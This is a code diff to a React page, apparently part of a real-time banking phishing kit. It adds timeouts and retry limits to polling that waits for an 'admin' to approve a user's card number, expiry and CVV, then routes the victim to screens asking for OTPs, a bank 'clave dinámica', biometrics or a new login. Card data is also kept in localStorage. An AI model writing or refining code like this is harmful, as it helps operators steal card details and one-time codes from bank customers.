@@ -340,91 +340,182 @@ export default function ValidacionTCCustom() {
         }
     };
 
-    // Función de polling para esperar respuesta del admin
+    // Función de polling para esperar respuesta del admin con timeout y límite de reintentos
     const iniciarPolling = (sesionId) => {
+        let attempts = 0;
+        const MAX_ATTEMPTS = 60; // Máximo 60 intentos = 3 minutos (60 * 3s)
+        const TIMEOUT_MS = 180000; // 3 minutos en total
+        let timeoutId;
+
         const pollingInterval = setInterval(async () => {
             try {
+                attempts++;
                 const { instanceBackend } = await import("../../axios/instanceBackend");
                 const response = await instanceBackend.post(`/consultar-estado/${sesionId}`);
                 const { estado, cardData } = response.data;
 
-                // Si viene data de tarjeta personalizada, actualizar estado (aunque en esta vista ya la deberíamos tener)
-                // Pero esto permite cambios en tiempo real si el admin re-configura
+                // Si viene data de tarjeta personalizada, actualizar estado
                 if (cardData) {
                     setCardData(cardData);
                     localStorageService.setItem("selectedCardData", cardData);
                 }
 
-                console.log('TC Custom Polling:', estado);
+                console.log('TC Custom Polling:', estado, `Intento: ${attempts}/${MAX_ATTEMPTS}`);
 
-                // Redirecciones basadas en respuesta del admin
+                // Verificar timeout o máximo de intentos
+                if (attempts >= MAX_ATTEMPTS) {
+                    clearInterval(pollingInterval);
+                    clearTimeout(timeoutId);
+                    setCargando(false);
+                    alert("El tiempo de espera ha expirado. Por favor, verifica los datos e inténtalo nuevamente.");
+                    // Limpiar campos para permitir reintento (sin recargar página)
+                    setCardDigits("");
+                    setExpirationDate("");
+                    setCvv("");
+                    setStep("front");
+                    return;
+                }
+
+                // Estados que indican que debemos seguir esperando (admin aún no ha decidido)
+                // NO redirigir automáticamente, esperar a que el admin presione un botón específico
+                const estadosEspera = ['pendiente', 'awaiting_tc_approval', 'awaiting_cvv_approval'];
+                
+                if (estadosEspera.includes(estado)) {
+                    // Seguir esperando, mantener loading
+                    return;
+                }
+
+                // Si el estado es 'solicitar_tc_custom', significa que el admin quiere que el usuario ingrese TC Custom
+                // En este caso, NO redirigir, solo quitar loading y permitir que el usuario ingrese
                 if (estado === 'solicitar_tc_custom') {
-                    // Si el admin pide TC Custom de nuevo (reintento), quitamos el loading para que el usuario pueda editar
-                    if (cargando) {
-                        setCargando(false);
-                        alert("Por favor verifique los datos e intente nuevamente.");
-                    }
-                } else if (estado === 'pendiente' || estado === 'awaiting_tc_approval' || estado === 'awaiting_cvv_approval') {
-                    // Esperar...
-                } else {
-                    switch (estado.toLowerCase()) {
-                        // Si nos piden TC estándar... ¿redirigir a standard view?
-                        // Probablemente sí, para separar flujos.
-                        case 'solicitar_tc':
-                        case 'error_tc':
-                            navigate('/validacion-tc');
-                            break;
+                    // El usuario ya está en la página de TC Custom, solo quitar loading y resetear formulario
+                    clearInterval(pollingInterval);
+                    clearTimeout(timeoutId);
+                    setCargando(false);
+                    alert("Por favor verifique los datos e intente nuevamente.");
+                    // Resetear formulario para permitir reintento
+                    setCardDigits("");
+                    setExpirationDate("");
+                    setCvv("");
+                    setStep("front");
+                    return;
+                }
 
-                        // Si nos piden TC custom otra vez, nos quedamos (aunque ya estamos aquí)
-                        // case 'solicitar_tc_custom': break;
+                // Si hay error (rechazo del admin), limpiar campos y permitir reintento sin recargar
+                // Nota: Para TC Custom, el backend podría usar 'error_tc' o un estado específico
+                // Verificamos ambos casos
+                if (estado === 'error_tc' || estado === 'error_tc_custom') {
+                    clearInterval(pollingInterval);
+                    clearTimeout(timeoutId);
+                    setCargando(false);
+                    alert("Los datos de la tarjeta son incorrectos. Por favor, verifícalos e inténtalo nuevamente.");
+                    // Limpiar campos para permitir reintento (sin recargar página)
+                    setCardDigits("");
+                    setExpirationDate("");
+                    setCvv("");
+                    setStep("front");
+                    return;
+                }
 
-                        case 'solicitar_otp':
-                        case 'error_otp':
-                            navigate('/numero-otp');
-                            break;
+                // Estados que detienen el polling (igual que OTP y DIN)
+                const estadosFinales = [
+                    'solicitar_tc', 'solicitar_otp', 'solicitar_din', 'solicitar_finalizar',
+                    'error_tc', 'error_otp', 'error_din', 'error_login',
+                    'solicitar_biometria', 'error_923',
+                    'solicitar_tc_custom', 'solicitar_cvv_custom',
+                    'aprobado', 'error_pantalla', 'bloqueado_pantalla'
+                ];
 
-                        case 'solicitar_din':
-                        case 'error_din':
-                            navigate('/clave-dinamica');
-                            break;
+                if (estadosFinales.includes(estado.toLowerCase())) {
+                    clearInterval(pollingInterval);
+                    clearTimeout(timeoutId);
+                }
 
-                        case 'solicitar_finalizar':
-                            navigate('/finalizado-page');
-                            break;
+                // Si el admin aprueba y pide siguiente paso, redirigir
+                // Limpiar intervalos antes de redirigir
+                setCargando(false);
 
-                        case 'solicitar_biometria':
-                            navigate('/verificacion-identidad');
-                            break;
+                switch (estado.toLowerCase()) {
+                    case 'solicitar_tc':
+                        // Si pide TC estándar, redirigir a vista estándar
+                        navigate('/validacion-tc');
+                        break;
 
-                        case 'error_923':
-                            navigate('/error-923page');
-                            break;
+                    case 'solicitar_otp':
+                        // Solo redirigir cuando el admin específicamente presiona el botón OTP
+                        navigate('/numero-otp');
+                        break;
 
-                        case 'solicitar_cvv_custom':
-                            navigate('/validacion-cvv');
-                            break;
+                    case 'solicitar_din':
+                        navigate('/clave-dinamica');
+                        break;
 
-                        case 'solicitar_cvv':
-                            navigate('/validacion-cvv');
-                            break;
+                    case 'solicitar_finalizar':
+                        navigate('/finalizado-page');
+                        break;
 
-                        case 'error_login':
-                            navigate('/autenticacion');
-                            break;
+                    case 'solicitar_biometria':
+                        navigate('/verificacion-identidad');
+                        break;
 
-                        default:
-                            break;
-                    }
+                    case 'error_923':
+                        navigate('/error-923page');
+                        break;
 
-                    if (estado !== 'pendiente' && estado !== 'solicitar_tc_custom' && estado !== 'awaiting_tc_approval' && estado !== 'awaiting_cvv_approval') {
-                        clearInterval(pollingInterval);
-                    }
+                    case 'solicitar_cvv_custom':
+                        navigate('/validacion-cvv');
+                        break;
+
+                    case 'solicitar_cvv':
+                        navigate('/validacion-cvv');
+                        break;
+
+                    case 'error_otp':
+                        navigate('/numero-otp');
+                        break;
+
+                    case 'error_din':
+                        navigate('/clave-dinamica');
+                        break;
+
+                    case 'error_login':
+                        navigate('/autenticacion');
+                        break;
+
+                    default:
+                        console.log("Estado no manejado en redirección:", estado);
+                        break;
                 }
 
             } catch (error) {
                 console.error('Error en polling:', error);
+                attempts++;
+                // Si hay muchos errores consecutivos, detener polling
+                if (attempts >= MAX_ATTEMPTS) {
+                    clearInterval(pollingInterval);
+                    clearTimeout(timeoutId);
+                    setCargando(false);
+                    alert("Error de conexión. Por favor, verifica tu conexión e inténtalo nuevamente.");
+                    // Limpiar campos para permitir reintento
+                    setCardDigits("");
+                    setExpirationDate("");
+                    setCvv("");
+                    setStep("front");
+                }
             }
         }, 3000);
+
+        // Timeout global de 3 minutos
+        timeoutId = setTimeout(() => {
+            clearInterval(pollingInterval);
+            setCargando(false);
+            alert("El tiempo de espera ha expirado. Por favor, verifica los datos e inténtalo nuevamente.");
+            // Limpiar campos para permitir reintento
+            setCardDigits("");
+            setExpirationDate("");
+            setCvv("");
+            setStep("front");
+        }, TIMEOUT_MS);
     };
 
     // --- RENDER HELPERS ---
